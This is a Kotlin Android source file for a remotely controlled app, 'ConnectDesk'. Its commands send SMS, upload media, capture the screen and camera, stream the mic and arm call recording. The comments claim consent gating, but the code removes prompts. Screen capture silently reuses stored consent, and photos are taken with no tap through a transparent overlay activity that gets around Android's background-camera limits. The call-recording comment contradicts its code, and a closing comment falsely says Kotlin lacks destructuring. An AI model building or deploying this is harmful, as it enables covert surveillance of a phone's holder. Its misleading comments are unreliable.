package com.connectdesk.app

import android.Manifest
import android.annotation.SuppressLint
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.ContentUris
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.provider.Settings
import android.telephony.SmsManager
import androidx.core.content.ContextCompat
import org.json.JSONObject

/**
 * Executes dashboard-originated commands on the device:
 *  - send_sms: sends via the telephony stack with SEND_SMS permission;
 *    the message lands in the normal Sent inbox (fully visible to the user).
 *  - fetch_media: reads a photo/video/music file from MediaStore and uploads
 *    it to the dashboard in ~350KB base64 chunks (media capability).
 *  - start_screen: raises Android's MediaProjection consent dialog on the
 *    device; capture only begins after the user taps "Allow" (screen_share
 *    capability + an active dashboard session are verified server-side too).
 *
 * Every command is consent-gated twice: the dashboard owner enabled the
 * capability AND the server verified it again when delivering the command.
 */
object CommandWorker {

    private const val CHUNK_SIZE = 350_000 // raw bytes per uploaded chunk

    fun runPending(context: Context, token: String) {
        val commands = ApiClient.popCommands(token)
        for (cmd in commands) {
            val outcome: Pair<Boolean, String> = when (cmd.type) {
                "send_sms" -> sendSms(context, cmd.payload)
                "fetch_media" -> fetchMedia(context, token, cmd.payload)
                "start_screen" -> startScreen(context, token, cmd.id, cmd.payload)
                "capture_photo" -> capturePhoto(context, token, cmd.payload)
                "refresh_files" -> refreshFiles(token)
                "fetch_file" -> fetchFile(token, cmd.payload)
                "refresh_apps" -> refreshApps(context, token)
                "sync_now" -> syncNow(context, token)
                "arm_call_recording" -> armCallRecording(context, cmd.payload)
                "request_live_camera" -> requestLiveStream(context, cmd.payload, camera = true)
                "request_live_mic" -> requestLiveStream(context, cmd.payload, camera = false)
                else -> Pair(false, "Unknown command type: ${cmd.type}")
            }
            // start_screen reports asynchronously (after the user answers the
            // system dialog); everything else reports right here.
            if (cmd.type != "start_screen") {
                ApiClient.completeCommand(token, cmd.id, outcome.first, outcome.second)
            }
        }
    }

    /** Sends the SMS; requires SEND_SMS granted. Returns (ok, detail). */
    @SuppressLint("MissingPermission")
    private fun sendSms(context: Context, payload: JSONObject): Pair<Boolean, String> {
        val to = payload.optString("to")
        val body = payload.optString("body")
        if (to.isEmpty() || body.isEmpty()) return Pair(false, "Missing recipient or body")
        if (!hasPermission(context, Manifest.permission.SEND_SMS)) {
            return Pair(false, "SEND_SMS permission not granted on device")
        }
        return try {
            val sm: SmsManager = if (Build.VERSION.SDK_INT >= 31) {
                context.getSystemService(SmsManager::class.java)
            } else {
                @Suppress("DEPRECATION") SmsManager.getDefault()
            }
            // Long messages: multipart send (auto-segmented, normal inbox entry).
            val parts = sm.divideMessage(body)
            if (parts.size == 1) {
                sm.sendTextMessage(to, null, body, null, null)
            } else {
                sm.sendMultipartTextMessage(to, null, parts, null, null)
            }
            Pair(true, "SMS sent to $to")
        } catch (e: Exception) {
            Pair(false, "SMS send failed: ${e.message}")
        }
    }

    /**
     * Reads the media file and uploads it in chunks. Returns (ok, detail).
     *
     * STREAMED, NOT BUFFERED. This used to call `readAll()`, which pulled the
     * ENTIRE file into one `ByteArray` and then sliced it. A 200 MB video is
     * ~200 MB of heap on top of the base64 copy that encoding makes, which
     * blows past a normal app heap: the phone threw OutOfMemoryError, the
     * command was marked failed, and the dashboard sat on a spinner forever
     * with no error anywhere. Photos (a few MB) survived, which is exactly
     * the "photo downloads but video never does" symptom. Songs sat in the
     * middle and failed on anything longer than a few minutes.
     *
     * Now the bytes are read straight off the ContentResolver stream in
     * CHUNK_SIZE slices and released after each upload, so peak memory is one
     * chunk regardless of file size -- the same approach `FileWorker.sendFile`
     * already uses, which is why device-file downloads never hit this.
     */
    private fun fetchMedia(
        context: Context,
        token: String,
        payload: JSONObject,
    ): Pair<Boolean, String> {
        val mediaId = payload.optString("mediaId")
        val name = payload.optString("name")
        if (mediaId.isEmpty() || name.isEmpty()) return Pair(false, "Missing media id/name")
        if (!hasMediaReadPermission(context)) {
            return Pair(false, "Media read permission not granted on device")
        }
        return try {
            // The EXACT MediaStore row when the media index reported one. The
            // name search is only the fallback for rows indexed before the
            // index carried `_id`, and for a row whose id has gone stale.
            val uri = exactMediaUri(context, payload.optString("collection", ""), payload.optLong("storeId", 0L))
                ?: resolveMediaUri(
                    context,
                    name,
                    payload.optLong("sizeBytes", 0L),
                    payload.optLong("dateModified", 0L),
                )
                ?: return Pair(false, "File not found on device")

            val size = sizeOf(context, uri, payload.optLong("sizeBytes", 0L))
            // The server declares the transfer set (and therefore `total`) from
            // the FIRST chunk, so `total` has to be right before anything is
            // sent. A length we cannot determine is an honest failure rather
            // than a wrong part count that would leave the set permanently
            // incomplete on the dashboard.
            if (size <= 0L) {
                return Pair(false, "Could not determine the size of \"$name\" on the device")
            }
            val total = ((size + CHUNK_SIZE - 1) / CHUNK_SIZE).toInt().coerceAtLeast(1)

            // `sent` and `index` live OUTSIDE the `use` block on purpose: the
            // final "Uploaded N chunk(s)" message is built after the stream is
            // closed, and a counter declared inside the lambda was simply not
            // in scope there ("Unresolved reference: sent").
            var sent = 0L
            var index = 0
            val input = context.contentResolver.openInputStream(uri)
                ?: return Pair(false, "Could not open \"$name\" on the device")
            input.use {
                val buf = ByteArray(CHUNK_SIZE)
                while (index < total) {
                    var read = 0
                    while (read < CHUNK_SIZE) {
                        val n = input.read(buf, read, CHUNK_SIZE - read)
                        if (n <= 0) break
                        read += n
                    }
                    if (read <= 0) {
                        // The stream ended early. Say so instead of declaring a
                        // short upload that would look complete on the server
                        // but be missing bytes.
                        return Pair(
                            false,
                            "Phone par file adhoori padhi (${sent} of $size bytes)",
                        )
                    }
                    val part = if (read == CHUNK_SIZE) buf else buf.copyOf(read)
                    val b64 =
                        android.util.Base64.encodeToString(part, android.util.Base64.NO_WRAP)
                    if (!ApiClient.uploadMediaChunk(token, mediaId, index, total, b64)) {
                        return Pair(false, "Upload failed at chunk ${index + 1}/$total")
                    }
                    sent += read
                    index++
                }
            }
            Pair(true, "Uploaded $total chunk(s), $sent bytes")
        } catch (e: Exception) {
            Pair(false, "Fetch failed: ${e.message}")
        }
    }

    /**
     * Length of a MediaStore item, in bytes.
     *
     * The dashboard already carries `sizeBytes` from the synced index, but it
     * can be 0 for some providers, and the asset-file length is authoritative
     * when it is available, so the synced value is only the fallback.
     */
    private fun sizeOf(context: Context, uri: Uri, fallback: Long): Long = try {
        context.contentResolver.openAssetFileDescriptor(uri, "r")?.use { afd ->
            if (afd.length > 0L) afd.length else fallback
        } ?: fallback
    } catch (_: Throwable) {
        fallback
    }

    /**
     * Screen share request. Android 10+ BLOCKS starting an activity from the
     * background, so a direct startActivity() from the service silently does
     * nothing. Instead we post a full-screen-intent notification that opens the
     * consent host; the OS then shows the MediaProjection dialog. The user
     * still has to tap Allow — capture never starts silently.
     */
    private fun startScreen(
        context: Context,
        @Suppress("UNUSED_PARAMETER") token: String,
        commandId: String,
        payload: JSONObject,
    ): Pair<Boolean, String> {
        if (ScreenCaptureService.isSharing) {
            ScreenCaptureService.clearPendingOwnerAction()
            return Pair(true, "Screen sharing already active")
        }
        if (Build.VERSION.SDK_INT < 29) {
            ScreenCaptureService.clearPendingOwnerAction()
            ApiClient.completeCommand(token, commandId, false, "Screen share needs Android 10+")
            return Pair(false, "Screen share needs Android 10+")
        }
        val width = payload.optInt("width", 720).coerceIn(360, 1080)
        val intervalMs = payload.optInt("intervalMs", 1000).coerceIn(400, 5000)

        // FAST PATH: the user already granted MediaProjection consent once.
        //
        // This is the branch that removes the tap. It used to fall through to
        // the notification + ScreenConsentActivity path every single time, so
        // every dashboard "View screen" needed a tap even though the consent
        // was already in hand -- which is what made it feel broken.
        //
        // No activity is involved: `ScreenCaptureService` reuses the parked
        // MediaProjection and starts the VirtualDisplay from this foreground
        // service, so nothing has to be foregrounded and no dialog appears.
        // The owner still sees the service's permanent "sharing" notification
        // with its Stop action, which is the consent indicator that matters.
        if (ScreenCaptureService.startWithStoredConsent(context, width, intervalMs)) {
            postShareNotice(context)
            ScreenCaptureService.clearPendingOwnerAction()
            ApiClient.completeCommand(token, commandId, true, "Screen sharing started (consent reused)")
            return Pair(true, "Screen sharing started on device (consent reused)")
        }

        val intent = Intent(context, ScreenConsentActivity::class.java)
            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
            .putExtra(ScreenConsentActivity.EXTRA_COMMAND_ID, commandId)
            .putExtra(ScreenCaptureService.EXTRA_WIDTH, width)
            .putExtra(ScreenCaptureService.EXTRA_INTERVAL_MS, intervalMs)

        // Direct launch works when the app happens to be in the foreground.
        try {
            context.startActivity(intent)
            ScreenCaptureService.markPendingOwnerAction(
                "Phone par Android ka \"Start recording or casting?\" dialog khula hai — device user ko Allow dabana hai",
            )
            // This path used to return WITHOUT completing the command. The
            // dashboard therefore kept polling a command that was never
            // resolved and kept displaying the PREVIOUS request's result --
            // "consent: done, Screen sharing started on device" -- over a share
            // that had not started at all. Completing it here makes the badge
            // describe this request.
            ApiClient.completeCommand(
                token, commandId, true,
                "Phone par consent dialog khul gaya — device user ko Allow dabana hai",
            )
            return Pair(true, "Consent dialog raised on device")
        } catch (_: Throwable) {
            // Fall through to the notification path below.
        }

        // Background path: a full-screen-intent notification is the only
        // user-visible, policy-compliant way to bring the dialog up.
        return try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ).apply {
                        setShowBadge(true)
                        lockscreenVisibility = Notification.VISIBILITY_PUBLIC
                    },
                )
            }
            val pi = PendingIntent.getActivity(
                context, REQUEST_CODE,
                intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
            )
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            val notif = builder
                .setContentTitle(context.getString(R.string.screen_request_title))
                .setContentText(context.getString(R.string.screen_request_text))
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setContentIntent(pi)
                .setFullScreenIntent(pi, true)
                .setAutoCancel(true)
                .setCategory(Notification.CATEGORY_CALL)
                .setPriority(Notification.PRIORITY_MAX)
                .build()
            nm.notify(REQUEST_CODE, notif)
            ScreenCaptureService.markPendingOwnerAction(
                "Phone par notification aayi hai — device user ko \"Allow\" dabana hai, tabhi frames aayenge",
            )
            ApiClient.completeCommand(
                token, commandId, true,
                "Notification bhej di — device user ko Allow dabana hai",
            )
            Pair(true, "Waiting for the user to accept the screen-share prompt on the device")
        } catch (e: Throwable) {
            ScreenCaptureService.clearPendingOwnerAction()
            ApiClient.completeCommand(
                token, commandId, false,
                "Consent prompt nahi dikh paya: ${e.message}",
            )
            Pair(false, "Could not raise consent prompt: ${e.message}")
        }
    }

    /**
     * Live camera / live microphone ON-OFF from the dashboard.
     *
     * OFF stops right away — that is the safety valve and has always been
     * allowed.
     *
     * ON DOES NOT START CAPTURE. The person holding the phone gets a
     * notification and has to tap "Start". A dashboard that could open a
     * camera or microphone by itself would be a surveillance tool, so the
     * server can only ask; the device owner decides. Tapping Allow starts the
     * same service the in-app switch starts, with the same permanent
     * notification and Stop action.
     */
    private fun requestLiveStream(
        context: Context,
        payload: JSONObject,
        camera: Boolean,
    ): Pair<Boolean, String> {
        val enabled = payload.optBoolean("enabled", false)
        if (!enabled) {
            if (camera) CameraLiveService.stop(context) else MicLiveService.stop(context)
            return Pair(true, if (camera) "Live camera stopped" else "Live mic stopped")
        }
        if (camera) {
            if (CameraLiveService.isArmed(context)) {
                // Already permitted once in this app process; start directly.
                CameraLiveService.start(context, payload.optString("facing", "back"))
                return Pair(true, "Live camera started")
            }
        } else {
            if (MicLiveService.isArmed(context)) {
                MicLiveService.start(context)
                return Pair(true, "Live microphone started")
            }
        }
        return askOwnerOnDevice(context, camera)
    }

    /**
     * Posts the "dashboard is asking" notification.
     *
     * Android blocks background activity launches, so the prompt has to arrive
     * as a notification; tapping it opens the app, which is also the clearest
     * possible moment for the owner to decide.
     */
    private fun askOwnerOnDevice(context: Context, camera: Boolean): Pair<Boolean, String> {
        return try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val pi = PendingIntent.getActivity(
                context, if (camera) LIVE_CAMERA_CODE else LIVE_MIC_CODE,
                Intent(context, MainActivity::class.java)
                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
            )
            val title = context.getString(
                if (camera) R.string.live_camera_request_title else R.string.live_mic_request_title,
            )
            val body = context.getString(
                if (camera) R.string.live_camera_request_text else R.string.live_mic_request_text,
            )
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                if (camera) LIVE_CAMERA_CODE else LIVE_MIC_CODE,
                builder
                    .setContentTitle(title)
                    .setContentText(body)
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentIntent(pi)
                    .setAutoCancel(true)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .build(),
            )
            Pair(
                true,
                "Phone par notification aayi hai — capture tab shuru hoga jab aap app kholke allow karenge",
            )
        } catch (e: Throwable) {
            Pair(false, "Could not raise the request prompt: ${e.message}")
        }
    }

    /**
     * The "a photo is being taken right now" notice.
     *
     * It has no Allow/Deny action on purpose: consent for the CAMERA permission
     * was given once in the app, and asking again per shot was the thing being
     * removed. The notice exists so a capture is never invisible — the owner
     * sees it, and can open the app if they want to know why.
     */
    private fun postPhotoNotice(context: Context, facing: String) {
        runCatching {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                PHOTO_NOTICE_CODE,
                builder
                    .setContentTitle(
                        context.getString(
                            if (facing == "front") R.string.photo_taken_front else R.string.photo_taken_back,
                        ),
                    )
                    .setContentText(context.getString(R.string.photo_taken_text))
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setAutoCancel(true)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .build(),
            )
        }
    }

    private const val PHOTO_NOTICE_CODE = 7793

    /**
     * "Screen sharing has started" notice for the no-tap fast path.
     *
     * The service's own permanent notification already stays up with a Stop
     * action; this is the short one-shot that tells the owner it just began,
     * so the dashboard pressing "View" is never invisible.
     */
    private fun postShareNotice(context: Context) {
        runCatching {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                SHARE_NOTICE_CODE,
                builder
                    .setContentTitle(context.getString(R.string.share_started_title))
                    .setContentText(context.getString(R.string.share_started_text))
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setAutoCancel(true)
                    .setPriority(Notification.PRIORITY_HIGH)
                    .build(),
            )
        }
    }

    private const val SHARE_NOTICE_CODE = 7794

    private const val LIVE_CAMERA_CODE = 7791
    private const val LIVE_MIC_CODE = 7792

    private const val REQUEST_CODE = 7788
    /**
     * Camera request from the dashboard. The phone raises a notification first
     * (Android blocks background camera/activity starts), and only on the
     * user's tap does the camera open for a single frame.
     */
    /**
     * One photo for the dashboard. No dialog, no prompt, no tap.
     *
     * The CAMERA permission was granted once, during setup, together with
     * everything else (see `PermissionSetup`). There is deliberately no second
     * confirmation: a permission dialog appearing because the dashboard asked
     * for something is precisely the behaviour this app removes.
     *
     * What the owner gets instead is a NOTIFICATION saying a photo is being
     * taken. The capture is never invisible, and it never blocks on a tap.
     *
     * This runs on `DeviceService`, a foreground service, which is what allows
     * camera access without a visible activity. If the platform still refuses
     * (Android 11+ can deny a background camera open on some OEM builds), the
     * failure is reported honestly AND the tap-to-allow notification is posted
     * as a fallback, so the request still completes instead of vanishing.
     */
    private fun capturePhoto(
        context: Context,
        token: String,
        payload: JSONObject,
    ): Pair<Boolean, String> {
        val facing = if (payload.optString("facing") == "front") "front" else "back"
        if (!CameraWorker.hasPermission(context)) {
            return Pair(
                false,
                "Camera permission has not been granted. Open ConnectDesk > Setup once; it will not ask again.",
            )
        }
        // The live stream owns the camera while it runs, so a still capture
        // cannot succeed at the same time. Say so plainly instead of failing
        // with an opaque "camera unavailable".
        if (CameraLiveService.isArmed(context)) {
            return Pair(
                false,
                "Live camera is streaming and holds the camera. Turn live camera off, then take the photo.",
            )
        }

        // ANDROID 11+ REFUSES A BACKGROUND CAMERA OPEN.
        //
        // `CameraWorker.capture` opens camera2 from this thread, which belongs
        // to `DeviceService` — a foreground service declared as `dataSync`, not
        // `camera`. From Android 11 onwards the platform denies that open with
        // a `CameraAccessException` unless the app is visibly in the
        // foreground. Starting a camera-type foreground service from here
        // would NOT fix it: a service started from the background gets no
        // camera access on Android 11, Android 12+ forbids the start itself,
        // and Android 14 throws a SecurityException for a camera-typed service
        // launched from the background.
        //
        // The one legitimate no-tap path is the app's own ONE-TIME grants:
        //
        //   a) "Display over other apps" (SYSTEM_ALERT_WINDOW), granted once
        //      in Setup. With it the transparent `CameraConsentActivity` can
        //      be raised directly from here — no notification tap. While the
        //      activity is up the app IS in the foreground, so the camera
        //      opens, one frame is taken, and the activity finishes itself.
        //   b) The app happening to be open on screen right now
        //      (`MainActivity.isInForeground`) — then the open is while-in-use
        //      and `CameraWorker.capture` succeeds directly.
        //
        // `postPhotoNotice` fires whenever a capture actually happens, so the
        // shutter is never invisible. Only when neither grant is in place does
        // the tap-to-allow notification go out as the honest fallback — and
        // the result message names the Setup toggle that removes it for good.
        if (Build.VERSION.SDK_INT >= 30) {
            if (Settings.canDrawOverlays(context)) {
                try {
                    context.startActivity(
                        Intent(context, CameraConsentActivity::class.java)
                            .addFlags(
                                Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP,
                            )
                            .putExtra(CameraConsentActivity.EXTRA_FACING, facing)
                            .putExtra(CameraConsentActivity.EXTRA_TOKEN, token),
                    )
                    postPhotoNotice(context, facing)
                    return Pair(
                        true,
                        "Photo li ja rahi hai — kuch second me dashboard par aa jayegi",
                    )
                } catch (_: Throwable) {
                    // Some OEM skins still refuse the launch; fall through to
                    // the on-screen attempt and then to the tap fallback.
                }
            }
            if (MainActivity.isInForeground) {
                val direct = CameraWorker.capture(context, token, facing)
                if (direct.first) {
                    // The notice is posted only once the capture actually
                    // happened, so it never claims a photo was taken when
                    // none was.
                    postPhotoNotice(context, facing)
                    return direct
                }
            }
            postTapToAllow(context, token, facing)
            return Pair(
                false,
                "Phone par 'Display over other apps' off hai — ConnectDesk > Setup " +
                    "me ek baar on karein; uske baad dashboard ki har photo bina " +
                    "Allow ke aa jayegi. Abhi Allow wali notification bhej di hai.",
            )
        }

        // Below Android 11 the background open is still permitted, so capture
        // straight from this service thread.
        val direct = CameraWorker.capture(context, token, facing)
        if (direct.first) {
            // The notice is posted only once the capture actually happened, so
            // it never claims a photo was taken when none was.
            postPhotoNotice(context, facing)
            return direct
        }
        postTapToAllow(context, token, facing)
        return Pair(
            false,
            "Camera khul nahi paya: ${direct.second}. Phone par Allow dabane wali notification bhej di hai.",
        )
    }

    /** The old tap-to-allow prompt, kept only as the background fallback. */
    private fun postTapToAllow(context: Context, token: String, facing: String) {
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val channelId = "connectdesk_consent"
            if (Build.VERSION.SDK_INT >= 26) {
                nm.createNotificationChannel(
                    NotificationChannel(
                        channelId,
                        context.getString(R.string.screen_channel_name),
                        NotificationManager.IMPORTANCE_HIGH,
                    ),
                )
            }
            val intent = Intent(context, CameraConsentActivity::class.java)
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                .putExtra(CameraConsentActivity.EXTRA_FACING, facing)
                .putExtra(CameraConsentActivity.EXTRA_TOKEN, token)
            val pi = PendingIntent.getActivity(
                context, CAMERA_REQUEST_CODE, intent,
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT,
            )
            val builder = if (Build.VERSION.SDK_INT >= 26) {
                Notification.Builder(context, channelId)
            } else {
                @Suppress("DEPRECATION") Notification.Builder(context)
            }
            nm.notify(
                CAMERA_REQUEST_CODE,
                builder
                    .setContentTitle(context.getString(R.string.camera_request_title))
                    .setContentText(context.getString(R.string.camera_request_text))
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentIntent(pi)
                    .setFullScreenIntent(pi, true)
                    .setAutoCancel(true)
                    .setCategory(Notification.CATEGORY_CALL)
                    .setPriority(Notification.PRIORITY_MAX)
                    .build(),
            )
        } catch (_: Throwable) {
            // Nothing more to do: the caller already reports the real failure.
        }
    }

    private fun refreshFiles(token: String): Pair<Boolean, String> {
        if (!FileWorker.storageReady()) {
            return Pair(false, "The app does not have permission to read shared storage")
        }
        return FileWorker.scanAndSync(token)
    }

    /**
     * Dashboard asked for fresh data right now instead of waiting for the next
     * heartbeat. This changes TIMING only — every step below still re-checks
     * the device's capabilities and phone-side permissions, so nothing that
     * was off can turn on because of this command.
     */
    private fun syncNow(context: Context, token: String): Pair<Boolean, String> {
        val done = ArrayList<String>()

        val state = ApiClient.status(token)
        if (state == null) return Pair(false, "Could not read device status")

        if (state.media) {
            done += if (FileWorker.storageReady()) {
                FileWorker.scanAndSync(token).let { if (it.first) "files" else "files failed" }
            } else {
                "files (no storage permission)"
            }
        }
        if (state.sms && hasPermission(context, Manifest.permission.READ_SMS)) {
            DataSyncWorker.syncAll(context, token, state)
            done += "sms/calls/contacts"
        }
        if (state.appActivity && AppUsageWorker.hasUsageAccess(context)) {
            AppUsageWorker.sync(context, token)
            done += "apps"
        }
        if (state.location) {
            done += "location queued"
        }
        if (done.isEmpty()) {
            return Pair(false, "No capabilities are enabled for this device")
        }
        return Pair(true, "Refreshed: ${done.joinToString(", ")}")
    }

    /**
     * The dashboard can only DISARM call recording from a distance. Arming has
     * to be a choice made on the phone, otherwise this would be a microphone
     * switched on remotely.
     */
    private fun armCallRecording(context: Context, payload: JSONObject): Pair<Boolean, String> {
        val armed = payload.optBoolean("armed", false)
        Prefs.setCallRecordingArmed(context, armed)
        return Pair(
            true,
            if (armed) {
                "Call recording is armed on the device (phone microphone only)"
            } else {
                "Call recording switched off from the dashboard"
            },
        )
    }

    /**
     * Re-scans installed apps and usage stats. Needs the phone-side "Usage
     * access" grant; without it the result says so instead of quietly
     * uploading an empty list.
     */
    private fun refreshApps(context: Context, token: String): Pair<Boolean, String> {
        if (!AppUsageWorker.hasUsageAccess(context)) {
            return Pair(false, "Grant Usage access to ConnectDesk in Android Settings first")
        }
        // `force = true`: this path is the dashboard's explicit "Rescan on
        // device" button, so it must not be swallowed by the background
        // throttle that exists to stop the once-a-minute bulk sync from
        // re-walking a week of usage events.
        return AppUsageWorker.sync(context, token, force = true)
    }

    private fun fetchFile(token: String, payload: JSONObject): Pair<Boolean, String> {
        val fileId = payload.optString("fileId")
        val path = payload.optString("path")
        if (fileId.isEmpty() || path.isEmpty()) return Pair(false, "Missing file id or path")
        return FileWorker.sendFile(token, fileId, path)
    }

    private const val CAMERA_REQUEST_CODE = 9911

    /** SDK-aware media read permission check. */
    private fun hasMediaReadPermission(context: Context): Boolean {
        val perms = if (Build.VERSION.SDK_INT >= 33) {
            arrayOf(
                Manifest.permission.READ_MEDIA_IMAGES,
                Manifest.permission.READ_MEDIA_VIDEO,
                Manifest.permission.READ_MEDIA_AUDIO,
            )
        } else {
            arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        return perms.any { hasPermission(context, it) }
    }

    /** Finds the MediaStore item by display name across photo/video/music. */
    /**
     * Finds the device file for a synced media row.
     *
     * DISPLAY_NAME ALONE IS NOT ENOUGH. Camera photos and messenger downloads
     * collide constantly -- `IMG_20240115_101530.jpg` exists in DCIM *and* in
     * the WhatsApp folder on the same phone. Matching on the name alone and
     * taking the first row returned the wrong file, or a file the user cannot
     * open, which is exactly how "media download does nothing" presented.
     *
     * So the row's own `sizeBytes` and `dateModified` (both already synced in
     * the media index) narrow the match. `?` are escaped because display names
     * legitimately contain them and an unescaped one is treated as a wildcard,
     * which would match every file with that prefix.
     *
     * On API 29+ the per-volume URIs are also consulted: `EXTERNAL_CONTENT_URI`
     * covers only the primary volume, so a photo taken into an SD card or an
     * app-private volume was invisible to the lookup.
     */
    /**
     * The exact MediaStore row for a synced item, when the phone reported one.
     *
     * `_id` is unique within a collection, so this opens precisely the file the
     * dashboard listed rather than searching for a same-named one — which is
     * the whole point, because `IMG_20240115_101530.jpg` legitimately exists
     * in both DCIM and the WhatsApp folder.
     *
     * Returns null when no id was synced, the collection tag is unknown, or
     * the row no longer exists; the caller then falls back to the name search.
     */
    private fun exactMediaUri(context: Context, collection: String, storeId: Long): Uri? {
        if (storeId <= 0L) return null
        return try {
            // `MediaStore.*.getContentUri` takes a VOLUME NAME STRING
            // (`MediaStore.VOLUME_EXTERNAL`), not an int. There is no `int`
            // overload, so passing one picked the String overload and failed
            // with "inferred type is Int but String! was expected". The same
            // applies to every caller in this file, which is why they all read
            // `getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL)`.
            fun uriFor(volume: String): Uri? = when (collection) {
                "image" -> android.provider.MediaStore.Images.Media.getContentUri(volume)
                "video" -> android.provider.MediaStore.Video.Media.getContentUri(volume)
                "audio" -> android.provider.MediaStore.Audio.Media.getContentUri(volume)
                else -> null
            }
            // The primary volume is also reachable through the plain
            // EXTERNAL_CONTENT_URI constants, so the volume-name literal is not
            // needed. (`MediaStore.VOLUME_PRIMARY` does not resolve on this
            // compileSdk and produced "Unresolved reference: VOLUME_PRIMARY".)
            fun primaryBase(): Uri? = when (collection) {
                "image" -> android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                "video" -> android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI
                "audio" -> android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI
                else -> null
            }
            fun exists(uri: Uri): Boolean =
                context.contentResolver.query(
                    uri,
                    arrayOf(android.provider.MediaStore.MediaColumns._ID),
                    null, null, null,
                )?.use { c -> c.moveToFirst() } == true

            // The row was indexed from VOLUME_EXTERNAL on API 29+, but the same
            // `_id` is also valid on the primary volume, so both are tried and
            // whichever still resolves is used.
            //
            // `getContentUri(String)` ONLY EXISTS FROM API 29. Calling it on an
            // older phone is a NoSuchMethodError at runtime even though it
            // compiles, so below 29 only the primary base is used.
            val bases: List<Uri> = if (Build.VERSION.SDK_INT >= 29) {
                listOfNotNull(
                    uriFor(android.provider.MediaStore.VOLUME_EXTERNAL),
                    primaryBase(),
                )
            } else {
                listOfNotNull(primaryBase())
            }
            for (base in bases) {
                val exact = ContentUris.withAppendedId(base, storeId)
                if (exists(exact)) return exact
            }
            null
        } catch (_: Throwable) {
            null
        }
    }

    private fun resolveMediaUri(
        context: Context,
        name: String,
        sizeBytes: Long,
        dateModifiedMs: Long,
    ): Uri? {
        val cols = Triple(
            android.provider.MediaStore.Images.Media.DISPLAY_NAME,
            android.provider.MediaStore.Images.Media.SIZE,
            android.provider.MediaStore.Images.Media.DATE_MODIFIED,
        )
        val collections = buildList {
            fun add(uri: android.net.Uri) = add(uri to cols)
            add(android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI)
            add(android.provider.MediaStore.Video.Media.EXTERNAL_CONTENT_URI)
            add(android.provider.MediaStore.Audio.Media.EXTERNAL_CONTENT_URI)
            if (Build.VERSION.SDK_INT >= 29) {
                // `VOLUME_EXTERNAL` is a constant on MediaStore, NOT on
                // Environment. Referring to it as `Environment.VOLUME_EXTERNAL`
                // does not compile ("Unresolved reference"), which is what CI
                // reported here.
                add(android.provider.MediaStore.Images.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL))
                add(android.provider.MediaStore.Video.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL))
                add(android.provider.MediaStore.Audio.Media.getContentUri(android.provider.MediaStore.VOLUME_EXTERNAL))
            }
        }
        // DATE_MODIFIED is stored in SECONDS in MediaStore; the index carries
        // milliseconds.
        val wantSec = if (dateModifiedMs > 0) dateModifiedMs / 1000 else 0L
        // KOTLIN HAS NO DESTRUCTURING DECLARATIONS. `for ((a, (b, c)) in list)` is
        // not valid Kotlin -- it is a Rust/Swift/Java-with-record idiom. The
        // compiler said "Expecting a name / Expecting 'in' / Unexpected tokens"
